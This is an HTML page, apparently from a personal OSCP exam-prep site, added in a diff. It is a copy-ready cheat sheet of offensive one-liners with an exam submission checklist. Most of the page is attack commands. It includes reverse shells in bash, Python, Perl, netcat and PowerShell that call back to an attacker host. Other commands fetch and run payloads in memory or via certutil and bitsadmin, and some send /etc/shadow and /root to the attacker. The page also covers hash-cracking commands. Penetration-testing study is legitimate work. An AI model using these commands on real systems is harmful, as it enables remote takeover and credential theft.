@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Shells &amp; File Transfers | Psalm OSCP</title>
+  <style>
+    :root {
+      --bg: #0a0e1a;
+      --bg2: #0d1117;
+      --card: #161b22;
+      --code-bg: #10151e;
+      --border: #21262d;
+      --border2: #30363d;
+      --text: #e6edf3;
+      --muted: #8b949e;
+      --dim: #6e7681;
+      --accent: #58a6ff;
+      --green: #3fb950;
+      --yellow: #d29922;
+      --red: #f85149;
+      --purple: #bc8cff;
+      --mono: 'Courier New', Courier, monospace;
+      --sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 15px; line-height: 1.6; }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* NAV */
+    .top-nav { display: flex; align-items: center; justify-content: space-between; padding: 0.85rem 2rem; background: var(--bg2); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
+    .logo { font-family: var(--mono); font-size: 1.05rem; color: var(--accent); font-weight: 700; }
+    .back-link { font-size: 0.82rem; color: var(--muted); border: 1px solid var(--border2); padding: 4px 12px; border-radius: 6px; transition: all 0.2s; }
+    .back-link:hover { background: var(--card); color: var(--text); text-decoration: none; }
+
+    /* LAYOUT */
+    .page { display: flex; max-width: 1380px; margin: 0 auto; }
+
+    /* SIDEBAR */
+    .sidebar { width: 230px; flex-shrink: 0; padding: 2rem 1rem 2rem 1.5rem; position: sticky; top: 54px; height: calc(100vh - 54px); overflow-y: auto; border-right: 1px solid var(--border); }
+    .sidebar-label { font-size: 0.68rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--dim); margin-bottom: 0.6rem; padding-bottom: 0.3rem; border-bottom: 1px solid var(--border); }
+    .sidebar ul { list-style: none; }
+    .sidebar li { margin-bottom: 1px; }
+    .sidebar li a { display: block; font-size: 0.8rem; color: var(--muted); padding: 4px 8px; border-radius: 4px; font-family: var(--mono); transition: all 0.15s; }
+    .sidebar li a:hover { background: var(--card); color: var(--accent); text-decoration: none; }
+    .sidebar-group { margin-top: 1.1rem; }
+    .sidebar-group-lbl { font-size: 0.65rem; letter-spacing: 0.08em; text-transform: uppercase; color: var(--dim); padding: 2px 8px; margin-bottom: 2px; display: block; }
+
+    /* MAIN */
+    .main { flex: 1; padding: 2rem 2.5rem 5rem; min-width: 0; }
+    .page-title { font-size: 1.9rem; font-weight: 700; margin-bottom: 0.4rem; }
+    .page-sub { color: var(--muted); font-size: 0.9rem; margin-bottom: 2.5rem; }
+
+    /* SECTIONS */
+    .sec { margin-bottom: 3rem; }
+    .sec-head { display: flex; align-items: center; gap: 10px; margin-bottom: 1.2rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+    .sec-head h2 { font-size: 1.2rem; font-weight: 600; }
+
+    /* CODE BLOCKS */
+    .cb { margin: 0.75rem 0; border: 1px solid var(--border2); border-radius: 8px; overflow: hidden; }
+    .cb-head { display: flex; align-items: center; justify-content: space-between; padding: 5px 13px; background: var(--card); border-bottom: 1px solid var(--border); gap: 8px; flex-wrap: wrap; }
+    .cb-lbl { font-size: 0.73rem; font-family: var(--mono); color: var(--muted); }
+    .cb-tags { display: flex; gap: 5px; margin-left: auto; }
+    .tag { font-size: 0.65rem; padding: 1px 7px; border-radius: 4px; font-family: var(--mono); border: 1px solid var(--border2); color: var(--dim); }
+    .t-your { border-color: #d2992255; color: var(--yellow); background: #d2992212; }
+    .t-crit { border-color: #f8514955; color: var(--red); background: #f8514912; }
+    .t-win  { border-color: #58a6ff55; color: var(--accent); background: #58a6ff12; }
+    .t-lin  { border-color: #3fb95055; color: var(--green); background: #3fb95012; }
+    .t-ad   { border-color: #bc8cff55; color: var(--purple); background: #bc8cff12; }
+    .cpb { font-size: 0.68rem; padding: 2px 9px; background: transparent; border: 1px solid var(--border2); border-radius: 4px; color: var(--dim); cursor: pointer; font-family: var(--mono); white-space: nowrap; transition: all 0.15s; }
+    .cpb:hover { background: var(--code-bg); color: var(--muted); }
+    pre { background: var(--code-bg); padding: 12px 15px; font-family: var(--mono); font-size: 0.8rem; line-height: 1.85; overflow-x: auto; color: var(--text); white-space: pre; }
+    .c  { color: var(--dim); }
+    .h  { color: var(--green); }
+    .w  { color: var(--yellow); }
+    .e  { color: var(--red); }
+
+    /* CALLOUTS */
+    .note  { padding: 9px 13px; border-radius: 6px; margin: 0.6rem 0; font-size: 0.83rem; line-height: 1.6; font-family: var(--mono); }
+    .n-info  { background: #1f6feb14; border: 1px solid #1f6feb44; color: #58a6ff; }
+    .n-warn  { background: #d2992214; border: 1px solid #d2992244; color: var(--yellow); }
+    .n-bad   { background: #f8514914; border: 1px solid #f8514944; color: var(--red); }
+    .n-good  { background: #3fb95014; border: 1px solid #3fb95044; color: var(--green); }
+
+    /* SIGNAL BOX */
+    .sig { background: var(--code-bg); border: 1px solid var(--border2); border-left: 3px solid var(--yellow); border-radius: 6px; padding: 11px 13px; margin: 0.75rem 0; font-family: var(--mono); font-size: 0.78rem; line-height: 1.95; }
+    .sig-title { font-size: 0.65rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--yellow); margin-bottom: 7px; display: block; }
+    .so { color: var(--muted); }
+    .sa { color: var(--green); }
+
+    /* GRID */
+    .two { display: grid; grid-template-columns: 1fr 1fr; gap: 0.9rem; }
+    @media(max-width:880px) { .sidebar{display:none;} .main{padding:1.2rem;} .two{grid-template-columns:1fr;} }
+
+    /* FOOTER */
+    footer { text-align: center; padding: 2rem; color: var(--dim); font-size: 0.78rem; border-top: 1px solid var(--border); font-family: var(--mono); margin-top: 2rem; }
+
+    /* COPY JS */
+  </style>
+  <script>
+    function cp(btn) {
+      const pre = btn.closest('.cb').querySelector('pre');
+      const text = pre.innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        const o = btn.textContent; btn.textContent = '✓ copied';
+        setTimeout(() => btn.textContent = o, 1500);
+      });
+    }
+  </script>
+</head><body>
+<nav class="top-nav">
+  <a class="logo" href="https://difficultsnow.github.io/PT-toolkit-main/index.html">&lt;DifficultSnow/&gt;</a>
+  <a class="back-link" href="index.html">← Psalm OSCP Methodology</a>
+</nav>
+<div class="page">
+  <aside class="sidebar">
+    <div class="sidebar-label">On This Page</div>
+    <ul>
+      <li><a href="#linux-shells">Linux Rev Shells</a></li>
+      <li><a href="#win-shells">Windows Rev Shells</a></li>
+      <li><a href="#dl-linux">Download — Linux</a></li>
+      <li><a href="#dl-win">Download — Windows</a></li>
+      <li><a href="#smb-server">SMB Server</a></li>
+      <li><a href="#exfil">Exfiltration</a></li>
+      <li><a href="#cracking">Hash Cracking</a></li>
+      <li><a href="#report">Report + Submission</a></li>
+    </ul>
+  </aside>
+  <main class="main">
+    <h1 class="page-title">💻 Shells &amp; File Transfers</h1>
+    <p class="page-sub">Every one-liner you need. Keep python3 -m http.server 8080 running in your http tmux window for the entire exam.</p>
+
+    <section class="sec" id="linux-shells">
+      <div class="sec-head"><h2>Linux Reverse Shells</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">listener</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>rlwrap nc -lvnp 4444
+rlwrap nc -lvnp 443   <span class="c"># use 443 if 4444 is filtered</span>
+pwncat-cs -lp 4444    <span class="c"># auto-stabilizes, file transfer built in</span></pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">all Linux one-liners</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># bash:</span>
+bash -i &gt;&amp; /dev/tcp/&lt;KALI&gt;/4444 0&gt;&amp;1
+bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;KALI&gt;/4444 0&gt;&amp;1'
+exec 5&lt;&gt;/dev/tcp/&lt;KALI&gt;/4444;cat &lt;&amp;5 | while read l; do $l 2&gt;&amp;5&gt;&amp;5;done
+
+<span class="c"># sh (if bash not available):</span>
+sh -i &gt;&amp; /dev/tcp/&lt;KALI&gt;/4444 0&gt;&amp;1
+
+<span class="c"># python3:</span>
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("&lt;KALI&gt;",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
+
+<span class="c"># python2:</span>
+python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("&lt;KALI&gt;",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
+
+<span class="c"># perl:</span>
+perl -e 'use Socket;$i="&lt;KALI&gt;";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");}'
+
+<span class="c"># nc with -e:</span>
+nc -e /bin/bash &lt;KALI&gt; 4444
+
+<span class="c"># nc without -e (busybox/Alpine):</span>
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc &lt;KALI&gt; 4444 &gt;/tmp/f</pre></div>
+    </section>
+
+    <section class="sec" id="win-shells">
+      <div class="sec-head"><h2>Windows Reverse Shells</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">PowerShell full one-liner</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>powershell -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('&lt;KALI&gt;',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2&gt;&amp;1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'&gt; ';$sb3=[Text.Encoding]::ASCII.GetBytes($sb2);$s.Write($sb3,0,$sb3.Length)}"</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">PowerShell in-memory (no disk)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>powershell -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://&lt;KALI&gt;:8080/Invoke-PowerShellTcp.ps1')"</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">cmd via nc.exe</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>nc.exe -e cmd.exe &lt;KALI&gt; 4444</pre></div>
+    </section>
+
+    <section class="sec" id="dl-linux">
+      <div class="sec-head"><h2>File Downloads — Linux Victim</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">download to victim</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>wget http://&lt;KALI&gt;:8080/&lt;file&gt; -O /tmp/&lt;file&gt;
+curl http://&lt;KALI&gt;:8080/&lt;file&gt; -o /tmp/&lt;file&gt;
+
+<span class="c"># Pure bash (no wget/curl):</span>
+exec 3&lt;&gt;/dev/tcp/&lt;KALI&gt;/8080 &amp;&amp; echo -e "GET /&lt;file&gt; HTTP/1.0\r\n\r\n" &gt;&amp;3 &amp;&amp; cat &lt;&amp;3 &gt; /tmp/&lt;file&gt;</pre></div>
+    </section>
+
+    <section class="sec" id="dl-win">
+      <div class="sec-head"><h2>File Downloads — Windows Victim</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">all download methods</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># PowerShell WebClient (most reliable):</span>
+(New-Object Net.WebClient).DownloadFile('http://&lt;KALI&gt;:8080/shell.exe','C:\Windows\Temp\shell.exe')
+
+<span class="c"># PowerShell Invoke-WebRequest:</span>
+iwr http://&lt;KALI&gt;:8080/shell.exe -OutFile C:\Windows\Temp\shell.exe
+Invoke-WebRequest -Uri http://&lt;KALI&gt;:8080/shell.exe -OutFile C:\Windows\Temp\shell.exe
+
+<span class="c"># certutil (no PowerShell needed):</span>
+certutil.exe -urlcache -f http://&lt;KALI&gt;:8080/shell.exe C:\Windows\Temp\shell.exe
+
+<span class="c"># bitsadmin:</span>
+bitsadmin /transfer job /download /priority normal http://&lt;KALI&gt;:8080/shell.exe C:\Windows\Temp\shell.exe</pre></div>
+    </section>
+
+    <section class="sec" id="smb-server">
+      <div class="sec-head"><h2>SMB Server (Kali → Windows)</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">impacket smbserver</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># On kali:</span>
+impacket-smbserver share $(pwd) -smb2support
+<span class="c"># With auth (modern Windows requires auth):</span>
+impacket-smbserver share $(pwd) -smb2support -username user -password pass123
+
+<span class="c"># On victim:</span>
+net use \\&lt;KALI&gt;\share /user:user pass123
+copy \\&lt;KALI&gt;\share\shell.exe C:\Windows\Temp\shell.exe
+<span class="c"># Or run directly without copying:</span>
+\\&lt;KALI&gt;\share\shell.exe</pre></div>
+    </section>
+
+    <section class="sec" id="exfil">
+      <div class="sec-head"><h2>Exfiltration</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">Linux → Kali</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># nc receiver on kali:</span>
+nc -lvnp 9001 &gt; loot.tar.gz
+<span class="c"># On victim — send:</span>
+tar czf - /etc/passwd /root/ 2&gt;/dev/null | nc &lt;KALI&gt; 9001
+
+<span class="c"># curl POST to kali:</span>
+curl -X POST http://&lt;KALI&gt;:8888 --data-binary @/etc/shadow</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">Windows → Kali</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># nc receiver on kali:</span>
+nc -lvnp 9001 &gt; loot.zip
+<span class="c"># On victim:</span>
+Compress-Archive -Path C:\Users\Administrator\Desktop\proof.txt -DestinationPath C:\Windows\Temp\loot.zip
+$c=New-Object Net.Sockets.TcpClient('&lt;KALI&gt;',9001);$f=[IO.File]::ReadAllBytes('C:\Windows\Temp\loot.zip');$c.GetStream().Write($f,0,$f.Length)</pre></div>
+    </section>
+
+    <section class="sec" id="cracking">
+      <div class="sec-head"><h2>Hash Cracking — Quick Reference</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">identify hash type</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>hashid '&lt;hash&gt;'
+hash-identifier '&lt;hash&gt;'
+<span class="c"># Visual guide:</span>
+<span class="c"># $1$   → md5crypt (Linux shadow)     → hashcat -m 500</span>
+<span class="c"># $5$   → sha256crypt                 → hashcat -m 7400</span>
+<span class="c"># $6$   → sha512crypt (Linux shadow)  → hashcat -m 1800</span>
+<span class="c"># $2y$  → bcrypt                      → hashcat -m 3200</span>
+<span class="c"># 32hex → NTLM                        → hashcat -m 1000</span>
+<span class="c"># user::domain:chall:hash → NTLMv2   → hashcat -m 5600</span>
+<span class="c"># $krb5tgs$23$ → Kerberoast           → hashcat -m 13100</span>
+<span class="c"># $krb5asrep$23$ → AS-REP             → hashcat -m 18200</span></pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">hashcat all modes</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>hashcat -m 0    hash.txt /usr/share/wordlists/rockyou.txt          <span class="c"># MD5</span>
+hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt          <span class="c"># NTLM</span>
+hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt          <span class="c"># sha512crypt</span>
+hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt          <span class="c"># bcrypt</span>
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt          <span class="c"># NTLMv2</span>
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt         <span class="c"># Kerberoast</span>
+hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt         <span class="c"># AS-REP</span>
+<span class="c"># With rules (catches Password1 → P@ssw0rd variants):</span>
+hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+<span class="c"># Show cracked hashes after session:</span>
+hashcat -m 1000 hash.txt --show</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">john — format conversions</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+ssh2john id_rsa &gt; ssh.hash &amp;&amp; john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+zip2john file.zip &gt; zip.hash &amp;&amp; john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
+keepass2john keepass.kdbx &gt; kp.hash &amp;&amp; john --wordlist=/usr/share/wordlists/rockyou.txt kp.hash</pre></div>
+    </section>
+
+    <section class="sec" id="report">
+      <div class="sec-head"><h2>Report + Submission Checklist</h2></div>
+      <div class="note n-bad">Hard stop on hacking at hour 18. All remaining time = report only. Graders need to reproduce every step.</div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">required screenshots per machine</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># 1. nmap output showing open ports + service versions</span>
+<span class="c"># 2. The command that gave initial access (shell appearing)</span>
+<span class="c"># 3. Low-priv shell: whoami/id + hostname + ip/ipconfig</span>
+<span class="c"># 4. The command that escalated privileges</span>
+<span class="c"># 5. Root/SYSTEM shell: whoami/id + hostname</span>
+<span class="c"># 6. proof.txt: cat/type proof.txt IN SAME WINDOW as whoami</span>
+<span class="c"># AD: screenshot for each machine in the chain (DC1, DC2, DA on DC)</span></pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">submission checklist</span><div class="cb-tags"><span class="tag t-crit">required</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># PDF named:     OSCP-OS-XXXXX-Exam-Report.pdf</span>
+<span class="c"># Archive:       OSCP-OS-XXXXX-Exam-Report.7z  (no password)</span>
+<span class="c"># Archive size:  under 200MB</span>
+<span class="c"># All PoC scripts included as TEXT inside the PDF</span>
+<span class="c"># Machine order in report = grading order</span>
+<span class="c"># Every machine: proof.txt + whoami + hostname in ONE screenshot</span>
+<span class="c"># Upload to:     https://upload.offsec.com</span>
+<span class="c"># Deadline:      within 24 hours of exam end</span>
+
+<span class="c"># Archive command:</span>
+7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf</pre></div>
+    </section>
+
+  </main>
+</div>
+<footer>&lt;DifficultSnow/&gt; | Psalm OSCP Methodology</footer>
+</body></html>
